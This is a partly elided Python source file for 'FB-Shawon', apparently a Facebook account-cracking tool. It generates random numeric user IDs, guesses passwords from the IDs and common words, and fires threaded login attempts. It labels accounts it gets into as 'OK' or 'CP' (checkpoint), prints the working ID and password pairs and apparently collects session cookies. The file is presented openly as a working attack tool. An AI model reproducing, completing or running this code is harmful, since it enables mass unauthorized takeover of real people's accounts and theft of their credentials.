...
\ `--.| |__   __ ___      _____  _ __  
 `--. \ '_ \ / _` \ \ /\ / / _ \| '_ \ 
/\__/ / | | | (_| |\ V  V / (_) | | | |
\____/|_| |_|\__,_| \_/\_/ \___/|_| |_| \033[91;1m
╔════════════════════════════════════════╗
║ [😆] CODED BY : Shawon    
║ [😕] GITHUB   : Shawon-404            
║ [😕] GITHUB   : Milon-404
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract FB-Shawon')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/Shawon-404");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/FB.Shawon.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-Shawon {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=100067813567675");time.sleep(3);os.system('xdg-open https://www.facebook.com/profile.php?id=100067813567675');exit()
    else:
...
def mainx2():
    ...
    if mahin in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.Shawon.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as Shawon_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:Shawon_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:Shawon_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:Shawon_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:Shawon_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:Shawon_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:Shawon_xd.submit(f1,idf,pwv)
            else:
               Shawon_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as Shawon_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:Shawon_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:Shawon_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:Shawon_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:Shawon_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:Shawon_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:Shawon_xd.submit(f1,idf,pwv)
      else:
       Shawon_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as Shawon_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:Shawon_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:Shawon_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:Shawon_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:Shawon_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:Shawon_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-Shawon.py')
...
def x6():
  ...
  with tred(max_workers=30) as Shawon_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:Shawon_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:Shawon_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:Shawon_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:Shawon_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:Shawon_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:Shawon_xd.submit(f1,idf,pwv)
  ...
  with tred(max_workers=30) as Shawon_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:Shawon_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:Shawon_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:Shawon_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:Shawon_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:Shawon_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:Shawon_xd.submit(f1,idf,pwv)
      else:
       Shawon_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-Shawon.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mShawon","\x1b[1;92mShawon","\x1b[1;93mShawon","\x1b[1;94mShawon","\x1b[1;95mShawon","\x1b[1;96mShawon","\x1b[1;97mShawon","\x1b[1;91mShawon","\x1b[1;92mShawon","\x1b[1;93mShawon","\x1b[1;94mShawon","\x1b[1;95mShawon","\x1b[1;96mShawon"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mShawon-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}Shawon-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
